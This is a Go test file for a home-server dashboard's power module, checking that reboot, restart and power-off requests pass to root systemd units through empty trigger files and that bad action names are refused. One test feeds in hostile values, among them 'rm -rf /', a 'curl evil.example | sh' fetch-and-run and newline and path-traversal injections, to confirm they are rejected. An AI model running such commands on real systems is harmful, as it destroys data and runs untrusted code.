package power

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// newService points a Service at temporary directories and, when asked,
// installs a fake path unit per action — which is all Available() looks at.
func newService(t *testing.T, withHelper bool) *Service {
	t.Helper()
	state, units := t.TempDir(), t.TempDir()
	s := NewService(state)
	s.unitDir = units
	if withHelper {
		for _, a := range Actions {
			name := filepath.Base(a.unit())
			if err := os.WriteFile(filepath.Join(units, name), []byte("[Path]\n"), 0o600); err != nil {
				t.Fatal(err)
			}
		}
	}
	return s
}

// TestTriggersCarryNoContent is the guarantee the whole design rests on. Each
// action signals through its own file and the file is empty, so the root unit
// never parses anything Holocron wrote. Putting the action name inside a shared
// trigger would hand a root process data from a web server and make the safety
// depend on an allowlist in this package — which is what the pattern exists to
// avoid.
func TestTriggersCarryNoContent(t *testing.T) {
	t.Parallel()
	s := newService(t, true)

	for _, a := range Actions {
		if err := s.Request(a); err != nil {
			t.Fatalf("Request(%q): %v", a, err)
		}
		body, err := os.ReadFile(filepath.Join(s.stateDir, a.trigger()))
		if err != nil {
			t.Fatalf("reading the trigger for %q: %v", a, err)
		}
		if len(body) != 0 {
			t.Errorf("%q wrote %q into its trigger; it must be a signal, not a message", a, body)
		}
	}

	// And each action has its own file, so the units cannot be confused about
	// which one fired.
	seen := map[string]Action{}
	for _, a := range Actions {
		if other, dup := seen[a.trigger()]; dup {
			t.Errorf("%q and %q share the trigger %q", a, other, a.trigger())
		}
		seen[a.trigger()] = a
	}
}

// TestUnknownActionsAreRefused: the name arrives from a client.
func TestUnknownActionsAreRefused(t *testing.T) {
	t.Parallel()
	s := newService(t, true)

	for _, bogus := range []Action{
		"rm -rf /", "poweroff; curl evil.example | sh", "",
		"POWEROFF", "restart-jellyfin\nreboot", "../../poweroff",
	} {
		if err := s.Request(bogus); err == nil {
			t.Errorf("Request(%q) was accepted", bogus)
		}
	}
	entries, err := os.ReadDir(s.stateDir)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 0 {
		t.Errorf("a rejected action left files behind: %v", entries)
	}
}

func TestRequestNeedsTheHelper(t *testing.T) {
	t.Parallel()
	s := newService(t, false)

	if s.Installed() {
		t.Error("no unit files, so no helper")
	}
	// A distinct error: the fix is to re-run the installer, not to try again.
	if err := s.Request(ActionReboot); !errors.Is(err, ErrNoHelper) {
		t.Errorf("Request = %v, want ErrNoHelper", err)
	}
}

func TestTriggerIsOwnerOnly(t *testing.T) {
	t.Parallel()
	s := newService(t, true)
	if err := s.Request(ActionReboot); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(filepath.Join(s.stateDir, ActionReboot.trigger()))
	if err != nil {
		t.Fatal(err)
	}
	// Root sees it regardless, and nothing else has business to.
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("mode = %v, want 0600", perm)
	}
}

func TestPendingReportsWhatWasAsked(t *testing.T) {
	t.Parallel()
	s := newService(t, true)

	if _, ok := s.Pending(); ok {
		t.Error("nothing has been asked for yet")
	}
	if err := s.Request(ActionRestartJellyfin); err != nil {
		t.Fatal(err)
	}
	got, ok := s.Pending()
	if !ok || got != ActionRestartJellyfin {
		t.Errorf("Pending = %q, %v", got, ok)
	}
}

// TestStalePendingIsNotReported: the helper deletes the trigger as its first
// step, so a file still sitting there long afterwards means the path unit never
// fired. Reporting "in progress" forever would leave the screen stuck with no
// way to try again.
func TestStalePendingIsNotReported(t *testing.T) {
	t.Parallel()
	s := newService(t, true)
	if err := s.Request(ActionPowerOff); err != nil {
		t.Fatal(err)
	}

	path := filepath.Join(s.stateDir, ActionPowerOff.trigger())
	old := time.Now().Add(-2 * pendingFor)
	if err := os.Chtimes(path, old, old); err != nil {
		t.Fatal(err)
	}
	if got, ok := s.Pending(); ok {
		t.Errorf("Pending = %q after %v; a request that old was never picked up", got, 2*pendingFor)
	}
}

// TestOnlyPoweringOffNeedsTheToken pins where the line is drawn, and it is
// irreversibility rather than disruption. Reboot deliberately does NOT share
// the token gate with power off: identical friction would train one gesture for
// both, and the one that bites is the one that does not come back.
func TestOnlyPoweringOffNeedsTheToken(t *testing.T) {
	t.Parallel()
	want := map[Action]bool{
		ActionRestartJellyfin:   false,
		ActionRestartQbit:       false,
		ActionRestartCloudflare: false,
		ActionRestartHolocron:   false,
		ActionReboot:            false,
		ActionPowerOff:          true,
	}
	for _, a := range Actions {
		expected, listed := want[a]
		if !listed {
			t.Fatalf("action %q has no decision about the token; add it here deliberately", a)
		}
		if a.NeedsToken() != expected {
			t.Errorf("%q needs token = %v, want %v", a, a.NeedsToken(), expected)
		}
	}
	if len(want) != len(Actions) {
		t.Errorf("%d actions but %d decisions", len(Actions), len(want))
	}
}

func TestEveryActionExplainsItself(t *testing.T) {
	t.Parallel()
	// These are the only warning the user gets before something disruptive,
	// so an empty one is a bug rather than a cosmetic gap.
	for _, a := range Actions {
		if strings.TrimSpace(a.Label()) == "" {
			t.Errorf("%q has no label", a)
		}
		if strings.TrimSpace(a.Detail()) == "" {
			t.Errorf("%q does not say what it costs", a)
		}
		if !strings.Contains(a.Confirm(), a.Label()) {
			t.Errorf("%q: the confirmation should name the action, got %q", a, a.Confirm())
		}
	}
}

func TestValidRejectsAnythingElse(t *testing.T) {
	t.Parallel()
	for _, s := range []string{"", " poweroff", "poweroff ", "shutdown", "../../poweroff"} {
		if _, ok := Valid(s); ok {
			t.Errorf("Valid(%q) accepted it", s)
		}
	}
	for _, a := range Actions {
		if got, ok := Valid(string(a)); !ok || got != a {
			t.Errorf("Valid(%q) = %q, %v", a, got, ok)
		}
	}
}

// TestPowerOffSaysItIsOneWay: a Pi 4 has no wake-on-LAN, so this button is not
// reversible from anywhere but the room the machine is in. The warning has to
// say that, not "are you sure".
func TestPowerOffSaysItIsOneWay(t *testing.T) {
	t.Parallel()
	detail := ActionPowerOff.Detail()
	for _, phrase := range []string{"no se puede encender a distancia", "fuera de casa"} {
		if !strings.Contains(strings.ToLower(detail), phrase) {
			t.Errorf("the warning should mention %q, got %q", phrase, detail)
		}
	}
}

// TestEachActionHasItsOwnUnit: the set of installable actions is the set of
// units, which is what makes it auditable from outside Holocron.
func TestEachActionHasItsOwnUnit(t *testing.T) {
	t.Parallel()
	seen := map[string]bool{}
	for _, a := range Actions {
		unit := a.unit()
		if seen[unit] {
			t.Errorf("%q reuses the unit %q", a, unit)
		}
		seen[unit] = true
		if !strings.HasPrefix(filepath.Base(unit), "holocron-") {
			t.Errorf("%q: unit %q should be listable with 'systemctl list-units holocron-*'", a, unit)
		}
	}
}

// TestActionsAreOfferedIndividually: an install that only has some of the units
// should show what it can actually do, rather than all or nothing.
func TestActionsAreOfferedIndividually(t *testing.T) {
	t.Parallel()
	s := newService(t, false)

	unit := filepath.Join(s.unitDir, filepath.Base(ActionRestartJellyfin.unit()))
	if err := os.WriteFile(unit, []byte("[Path]\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	if !s.Available(ActionRestartJellyfin) || !s.Installed() {
		t.Error("the one installed action should be offered")
	}
	if s.Available(ActionPowerOff) {
		t.Error("an action with no unit must not be offered")
	}
	if err := s.Request(ActionPowerOff); !errors.Is(err, ErrNoHelper) {
		t.Errorf("Request without its unit = %v, want ErrNoHelper", err)
	}
}
